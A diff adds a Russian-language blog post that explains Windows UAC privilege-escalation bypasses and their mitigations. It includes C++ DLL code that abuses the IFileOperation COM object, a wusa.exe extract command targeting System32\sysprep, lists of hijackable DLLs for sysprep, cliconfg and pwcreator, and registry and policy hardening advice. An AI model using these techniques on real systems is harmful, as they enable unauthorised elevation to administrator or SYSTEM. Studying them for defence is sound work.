@@ -1,0 +1,306 @@
+<h1 class="no_toc" id="оглавление">Оглавление</h1>
+
+<ul id="markdown-toc">
+  <li><a href="#введение" id="markdown-toc-введение">Введение</a></li>
+  <li><a href="#обход-uac" id="markdown-toc-обход-uac">Обход UAC</a></li>
+  <li><a href="#запись-в-безопасное-место" id="markdown-toc-запись-в-безопасное-место">Запись в безопасное место</a></li>
+  <li><a href="#ifileoperation-com-object" id="markdown-toc-ifileoperation-com-object">IFileOperation COM Object</a></li>
+  <li><a href="#windows-update-standalone-installer" id="markdown-toc-windows-update-standalone-installer">Windows Update Standalone Installer</a></li>
+  <li><a href="#эксплуатация-уязвимости-dll-hijacking" id="markdown-toc-эксплуатация-уязвимости-dll-hijacking">Эксплуатация уязвимости DLL hijacking</a></li>
+  <li><a href="#смягчение" id="markdown-toc-смягчение">Смягчение</a></li>
+  <li><a href="#контроль-учетных-записей-запуск-всех-администраторов-в-режиме-одобрения-администратором" id="markdown-toc-контроль-учетных-записей-запуск-всех-администраторов-в-режиме-одобрения-администратором">Контроль учетных записей: запуск всех администраторов в режиме одобрения администратором.</a></li>
+  <li><a href="#заключение" id="markdown-toc-заключение">Заключение</a></li>
+  <li><a href="#ссылки" id="markdown-toc-ссылки">Ссылки</a></li>
+</ul>
+
+<h1 id="введение">Введение</h1>
+
+<p>Защита компьютеров от злоупотреблений в корпоративной среде всегда была непрерывным процессом. Предоставление прав администратора пользователям всегда злоупотреблялось и пользователи устанавливали неутвержденное программное обеспечение, изменяли конфигурации и тд. Не предоставляй права локального администратора и они утверждают, что не могут выполнять свою работу. Если малварь скомпрометировала машину с полными правами администратора, то вы, скорее всего, попытаетесь переоборудовать ее.</p>
+
+<p>Контроль учетных записей (UAC) дает нам возможность работать со стандартными правами пользователя вместо полных прав администратора. Таким образом, даже если ваша стандартная учетная запись находится в группе локальных администраторов, ущерб ограничен. То есть установка служб, драйверов, запись в безопасные места и тд запрещены. Для выполнения этих действий пользователям потребуется взаимодействовать с рабочим столом, например, щелкнув правой кнопкой мыши и запустив их с правами администратора, или принять запрос на повышение прав от UAC. UAC был представлен начиная с Windows Vista и содержит ряд технологий включая виртуализацию файловой системы и реестра, учетную запись защищенного администратора (PA или Protected Administrator), запросы на повышение прав UAC и уровни целостности Windows.</p>
+
+<p>UAC работает регулируя уровень разрешений нашей учетной записи, поэтому действия программ выполняются из под обычного пользователя, даже если у нас есть права локального администратора на компьютере. Когда будут внесены изменения требующие разрешения на уровне администратора, UAC уведомит нас. Если у нас есть права локального администратора, мы можем нажать «Да», чтобы продолжить, в противном случае нам будет предложено ввести пароль администратора. Однако это будет зависеть от того, какие политики были определены в вашей среде.</p>
+
+<p>В этой статье показано, как легко можно обойти запросы на повышение прав UAC и какие действия можно предпринять для уменьшения этой угрозы.</p>
+
+<p><img src="/assets/img/posts/bypass uac/regedituac.png" alt="1" class="imghalf" /></p>
+
+<h1 id="обход-uac">Обход UAC</h1>
+
+<p>Эксплуатация UAC является тривиальным процессом. Есть два этапа которые необходимо пройти для достижения обхода, чтобы подняться от стандартных прав пользователя до прав администратора. Эти шаги широко опубликованы, так что в этом нет ничего нового, хотя на этапе 2 документированы еще некоторые уязвимости связанные с захватом (hijacking) DLL.</p>
+
+<blockquote>
+  <p>Запиcь в безопасное место
+Эксплуатация DLL hijacking уязвимости</p>
+</blockquote>
+
+<p>Для того чтобы наш обход был успешным, мы должны начать с:</p>
+
+<blockquote>
+  <p>Стандартный пользователь в группе администраторов
+Исполняемый файл Windows который должен быть подписан сертификатом подписи кода Microsoft
+Исполняемый файл Windows должен находиться в безопасном каталоге
+Исполняемый файл Windows также должен указывать свойство автоматического поднятия прав (Elevate) в своем манифесте.</p>
+</blockquote>
+
+<h1 id="запись-в-безопасное-место">Запись в безопасное место</h1>
+<p>Есть несколько способов, которыми мы можем записать файл в безопасное место.</p>
+
+<blockquote>
+  <p>Использовать IFileOperation COM Object
+Использование автономного установщика Центра обновления Windows (Windows Update Standalone Installer/wusa.exe)</p>
+</blockquote>
+
+<h1 id="ifileoperation-com-object">IFileOperation COM Object</h1>
+
+<p>COM Object в IFileOperation имеет метод, который мы можем использовать для копирования файлов в наше безопасное место, так как операция автоматически поднимется в правах и сможет сделать копию привилегий. Для использования мы можем внедрить нашу вредоносную DLL в процесс средней целостности для выполнения операции. Поскольку для COM-объекта установлено автоматическое повышение уровня, внедренный процесс не нужно отмечать для автоматического повышения в своем манифесте.</p>
+
+<p>В Windows 7 внедрены процессы которые могут быть успешно скопированы, это:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\explorer.exe
+C:\Windows\System32\wuauclt.exe
+C:\Windows\System32\taskhost.exe
+</code></pre></div></div>
+
+<p>Во время тестов taskhost.exe срабатывает только один раз после загрузки, и wuauclt.exe не всегда работает, что оставляет только explorer.exe надежным процессом.</p>
+
+<p>On Windows 8 внедрены процессы которые успешно скопированы, это:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\explorer.exe
+C:\Windows\System32\wuauclt.exe
+C:\Windows\System32\RuntimeBroker.exe
+</code></pre></div></div>
+
+<p>И снова только explorer.exe надежный процесс, и единственный который работал в Windows 8.1</p>
+
+<p>Основная часть кода ниже взята из MSDN с некоторыми незначительными изменениями. Используемые значения SetOperationFlags были взяты из опубликованного кода обхода UAC <a href="https://download.pureftpd.org/pub/misc/UAC.cpp">здесь</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;Shobjidl.h&gt;
+#include &lt;Windows.h&gt;
+
+#pragma comment(lib, "Ole32.lib")
+#pragma comment(lib, "shell32.lib")
+
+int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+FileOperation  *pfo;
+IShellItem      *psiFrom = NULL;
+IShellItem      *psiTo = NULL;
+LPCWSTR pszSrcItem = L"calc.dll";
+LPCWSTR pszNewName = L"cryptbase.dll";
+LPCWSTR pszDest    = L"C:\\windows\\System32\\sysprep";
+
+HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+if (SUCCEEDED(hr))
+{
+ hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&amp;pfo));
+ if (SUCCEEDED(hr))
+ {
+ hr = pfo-&gt;SetOperationFlags( FOF_NOCONFIRMATION |
+ FOF_SILENT |
+ FOFX_SHOWELEVATIONPROMPT |
+ FOFX_NOCOPYHOOKS |
+ FOFX_REQUIREELEVATION |
+ FOF_NOERRORUI );
+ if (SUCCEEDED(hr))
+ {
+ hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&amp;psiFrom));
+ if (SUCCEEDED(hr))
+ {
+ if (NULL != pszDest)
+ {
+ hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&amp;psiTo));
+ }
+ if (SUCCEEDED(hr))
+ {
+ hr = pfo-&gt;CopyItem(psiFrom, psiTo, pszNewName, NULL);
+ if (NULL != psiTo)
+ {
+ psiTo-&gt;Release();
+ }
+ }
+ psiFrom-&gt;Release();
+ }
+ if (SUCCEEDED(hr))
+ {
+ hr = pfo-&gt;PerformOperations();
+ }
+ }
+ pfo-&gt;Release();
+ }
+ CoUninitialize();
+ }
+ return 0;
+}
+</code></pre></div></div>
+
+<h1 id="windows-update-standalone-installer">Windows Update Standalone Installer</h1>
+<p>Другой способ копирования в наше безопасное место, это использовать Windows Update Standalone Installer (wusa.exe). Wusa.exe запускается как процесс высокой целостности тк. настроен на авто-подъём прав в своем манифесте. Для автоматического повышения прав, исполняемый Windows файл должен быть подписан, находиться в безопасном каталоге, таком как C:\Windows\System32, и должен быть с правильно прописанным свойством autoElevate в своем манифесте.</p>
+
+<p><img src="/assets/img/posts/bypass uac/wusaautoelevate.png" alt="1" class="imghalf" /></p>
+
+<p>Мы используем wusa.exe для распаковки CAB файл (cabinet archive file или файл кабинетного архива) в наше безопасное место</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa c:\users\user1\desktop\poc.tmp /extract:c:\windows\system32\sysprep
+</code></pre></div></div>
+
+<h1 id="эксплуатация-уязвимости-dll-hijacking">Эксплуатация уязвимости DLL hijacking</h1>
+<p>При эксплуатации уязвимости перехвата DLL, исполняемый файл который мы собираемся запустить снова должен быть подписан; находится в безопасном каталоге; и должен указывать свойство autoElevate в своем манифесте для загрузки в качестве процесса с высокой степенью целостности.</p>
+
+<p>В Windows 7 есть три исполняемых файла которые можно эксплуатировать и связанные с ними библиотеки DLL перечисленны ниже:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\ehome\Mcx2Prov.exe
+C:\Windows\ehome\CRYPTBASE.dll
+
+C:\windows\System32\sysprep\sysprep.exe
+C:\Windows\System32\sysprep\CRYPTSP.dll
+C:\windows\System32\sysprep\CRYPTBASE.dll
+C:\Windows\System32\sysprep\RpcRtRemote.dll
+C:\Windows\System32\sysprep\UxTheme.dll
+
+C:\windows\System32\cliconfg.exe
+C:\Windows\System32\NTWDBLIB.DLL
+</code></pre></div></div>
+
+<p>На malwr.com вредоносная программа выложенная 25 Июня прошлого года, уже использовала Mcx2Prov.exe для обхода UAC, а днем позже эксплойт был <a href="https://github.com/hzeroo/Carberp/blob/master/source%20-%20absource/pro/all%20source/BJWJ/source/exploit/UAC_bypass.cpp">опубликован</a>.</p>
+
+<p><img src="/assets/img/posts/bypass uac/malwruac.png" alt="1" class="imghalf" /></p>
+
+<p>Тот же хэш был также отмечен на VirusTotal (38/54), был представлен более четырех месяцев назад.</p>
+
+<p>В Windows 8 также есть три исполняемых файла которые можно эксплуатировать и связанные с ними библиотеки DLL перечислены ниже:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\System32\sysprep\sysprep.exe
+C:\windows\System32\sysprep\CRYPTBASE.dll
+C:\Windows\System32\Sysprep\dwmapi.dll
+C:\Windows\System32\Sysprep\SHCORE.dll
+
+C:\windows\System32\cliconfg.exe
+C:\Windows\System32\NTWDBLIB.DLL
+
+C:\windows\System32\pwcreator.exe
+C:\Windows\System32\vds.exe
+C:\Windows\System32\UReFS.DLL
+</code></pre></div></div>
+
+<p>Наконец, в Windows 8.1 есть также три исполняемых файла которые можно эксплуатировать и связанные с ними библиотеки DLL перечисленны ниже:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\System32\sysprep\sysprep.exe
+C:\Windows\System32\Sysprep\SHCORE.dll
+C:\Windows\System32\Sysprep\OLEACC.DLL
+
+C:\windows\System32\cliconfg.exe
+C:\Windows\System32\NTWDBLIB.DLL
+
+C:\windows\System32\pwcreator.exe
+C:\Windows\System32\vds.exe
+C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
+C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
+C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
+C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
+C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
+</code></pre></div></div>
+
+<p>Вызов исполняемого файла pwcreator.exe (создание рабочей области Windows To Go) вызывает vds.exe (служба виртуальных дисков), которая затем загружает нашу DLL и даёт нам целостность системы работает из под SYSTEM аккаунта.</p>
+
+<p><img src="/assets/img/posts/bypass uac/proexpvds.png" alt="1" class="imghalf" /></p>
+
+<p>Вызов этих исполняемых файлов sysprep.exe, cliconfg.exe и pwcreater.exe приводит к появлению окна с графическим интерфейсом, но так же должен легко запуститься в фоновом режиме, а затем завершиться после эксплуатации. Это то что я не изучал слишком глубоко, поэтому тут я вас оставлю в неведении.</p>
+
+<p><img src="/assets/img/posts/bypass uac/sysprep.png" alt="1" class="imghalf" />
+<img src="/assets/img/posts/bypass uac/cliconfg.png" alt="1" class="imghalf" />
+<img src="/assets/img/posts/bypass uac/pwcreator.png" alt="1" class="imghalf" /></p>
+
+<h1 id="смягчение">Смягчение</h1>
+<p>Лучший способ смягчить этот обход - просто не предоставлять пользователям права локального администратора для своих компьютеров. Большинство учетных записей пользователей в корпоративной среде и вы должны быть в состоянии сделать это, уменьшая поверхность атаки. Это, однако, не распространяется на домашних пользователей, которые по умолчанию имеют права локального администратора.</p>
+
+<p>Фактически, обход работает только при двух средних выставленных настройках UAC, которые позволяют автоматически подниматься. Чтобы увидеть настройки вам нужно перейти в Панель управления - Учетные записи пользователей - Изменить настройки контроля учетных записей.</p>
+
+<blockquote>
+  <p>Уведомлять меня только когда приложения пытаются внести изменения в мой компьютер (по умолчанию)</p>
+</blockquote>
+
+<p><img src="/assets/img/posts/bypass uac/uacsettings.png" alt="1" class="imghalf" /></p>
+
+<p>Таким образом, мы могли бы установить “Всегда уведомлять”, но это вернуло бы его к тому, как это было в Windows Vista с постоянными уведомлениями и не очень практично, так же пользователь в конечном итоге установит его на “Никогда не уведомлять”, что определенно не является хорошей идеей.</p>
+
+<p>Microsoft предоставила нам 10 политик UAC с которыми стоит поиграть, поэтому стоит потратить некоторое время на их понимание и тестирование прежде чем внедрять их в среде своего домена. Чтобы увидеть, что применено на вашем локальном компьютере, введите secpol.msc в Start-Run, чтобы открыть  окно «Локальная политика безопасности» и развернуть папку «Параметры локальной политики безопасности». Запустите rsop.msc для просмотра групповых политик, применяемых на компьютерах в доменной среде.</p>
+
+<p><img src="/assets/img/posts/bypass uac/secpol.png" alt="1" class="imghalf" /></p>
+
+<p>Вот так выглядят в реестре значения UAC по умолчанию</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"ConsentPromptBehaviorAdmin"=dword:00000005
+"ConsentPromptBehaviorUser"=dword:00000003
+"EnableInstallerDetection"=dword:00000001
+"EnableLUA"=dword:00000001
+"EnableSecureUIAPaths"=dword:00000001
+"EnableUIADesktopToggle"=dword:00000000
+"EnableVirtualization"=dword:00000001
+"FilterAdministratorToken"=dword:00000000
+"PromptOnSecureDesktop"=dword:00000001
+"ValidateAdminCodeSignatures"=dword:00000000
+</code></pre></div></div>
+
+<p>Когда ползунок перемещается вверх до «Всегда уведомлять меня», он меняет это значение.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ConsentPromptBehaviorAdmin"=dword:00000002
+</code></pre></div></div>
+
+<p>Когда ползунок перемещается вниз до «Уведомлять меня только когда приложения пытаются внести изменения в мой компьютер (не изменяя настройки рабочего стола)», он меняет это значение.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"PromptOnSecureDesktop"=dword:00000000
+</code></pre></div></div>
+
+<p>Ну и когда ползунок перемещается в «Никогда не уведомлять», измененные значения это</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ConsentPromptBehaviorAdmin"=dword:00000000
+"EnableLUA"=dword:00000000
+"PromptOnSecureDesktop"=dword:00000000
+</code></pre></div></div>
+
+<p>Обратите внимание, что EnableLUA полностью отключен. Это чрезвычайно опасное значение, и его никогда не следует отключать, поэтому настоятельно рекомендуется включить эти параметры в групповых политиках чтобы они всегда применялись, если параметры сбрасываются/изменяются пользователями или ранее удаленными вредоносными программами.</p>
+
+<h1 id="контроль-учетных-записей-запуск-всех-администраторов-в-режиме-одобрения-администратором">Контроль учетных записей: запуск всех администраторов в режиме одобрения администратором.</h1>
+
+<p>После отключения, не только вредоносный процесс сможет переходить прямо в режим высокой целостности, но и Internet Explorer будет работать в режиме средней целостности. UAC предоставляет нам защищенный режим (песочницу) в Internet Explorer, обеспечивая дополнительную безопасность. Обычно Internet Explorer работает в процессе с низким уровнем целостности, поэтому если он скомпрометирован каким-либо эксплойтом IE то ущерб сводится к минимуму, так как при низкой целостности существует только несколько мест в которые он может быть записан в системе.</p>
+
+<p>Эти изменения, упомянутые выше, были замечены в Windows 7, в Windows 8/8.1 EnableLUA не изменяется на отключенный. Поэтому, когда ползунок перемещен в «Никогда не уведомлять», измененные значения приобретают только такой вид</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ConsentPromptBehaviorAdmin"=dword:00000000
+"PromptOnSecureDesktop"=dword:00000000
+</code></pre></div></div>
+
+<p>Поскольку значение “EnableLUA”=dword:00000001 не изменяется, UAC не полностью отключен и Internet Explorer по-прежнему будет работать с низким уровнем целостности.</p>
+
+<p><img src="/assets/img/posts/bypass uac/iew8low.png" alt="1" class="imghalf" /></p>
+
+<p>Однако, если пользователь вошел в систему с учетной записью локального администратора (администратором, или любым другим переименованным в вашей корпоративной сборке властителем), настройки UAC не применяются, поскольку все процессы работают с высокой степенью целостности. Это относится к Windows 7/8 и 8.1, поэтому всегда следите за тем чтобы пользователи НЕ входили в систему с использованием учетной записи локального администратора, если требуются права локального администратора, лучше добавьте свою учетную запись домена в группу локальных администраторов.</p>
+
+<p><img src="/assets/img/posts/bypass uac/compmanuac.png" alt="1" class="imghalf" />
+<img src="/assets/img/posts/bypass uac/iew8high.png" alt="1" class="imghalf" /></p>
+
+<p>Если по какой-либо причине необходимо войти в систему с использованием учетной записи локального администратора, лучше всего включить эту политику UAC.</p>
+
+<p>Контроль учетных записей (UAC): режим одобрения администратором (Admin Approval Mode) для встроенной учетной записи администратора</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>“FilterAdministratorToken”=dword:00000001
+</code></pre></div></div>
+
+<p>Другой вариант - это переименование или удаление исполняемых файлов Mcx2Prov.exe, sysprep.exe, cliconfg.exe и pwcreator.exe, если это не требуется в системе, чтобы второй этап эксплуатации DLL  hijacking провалился.</p>
+
+<p>Наконец, если пользователям требуются права локального администратора тогда стоит установить политику UAC своего компьютера на «Всегда уведомлять» и позволить им жить с постоянными уведомлениями.</p>
+
+<p>Контроль учетных записей (UAC): поведение запроса на повышение прав для администраторов в режиме одобрения администратором (Admin Approval Mode), 2-й запрос согласия на защищенный десктоп</p>
+
+<h1 id="заключение">Заключение</h1>
+<p>Этот обход работает только в случае когда удовлетворятся все требования для их эксплоинга. Не достаёт одного требования и обход не удастся. Офисные документы открываются в средней целостности, поэтому они являются идеальными целями для обхода UAC. Поскольку эти обходы осуществляются без особых усилий, единственным реальным способом противо-действий было бы установить для UAC «Всегда уведомлять» или удалить права локального администратора для пользователя. В конце концов, использование таких агентов как Microsoft EMET или MalwareBytes Anti-Exploit, было бы наилучшим решением для смягчения урона на ранних стадиях проведения атаки.</p>
+
+<h1 id="ссылки">Ссылки</h1>
+<blockquote>
+  <p><a href="http://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx">http://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx</a>
+<a href="http://technet.microsoft.com/en-us/magazine/2007.06.uac.aspx">http://technet.microsoft.com/en-us/magazine/2007.06.uac.aspx</a>
+<a href="http://windows.microsoft.com/en-gb/windows/what-is-user-account-control#1TC=windows-7">http://windows.microsoft.com/en-gb/windows/what-is-user-account-control#1TC=windows-7</a>
+<a href="http://windows.microsoft.com/en-gb/windows/what-are-user-account-control-settings#1TC=windows-7">http://windows.microsoft.com/en-gb/windows/what-are-user-account-control-settings#1TC=windows-7</a>
+<a href="http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know">http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know</a></p>
+</blockquote>
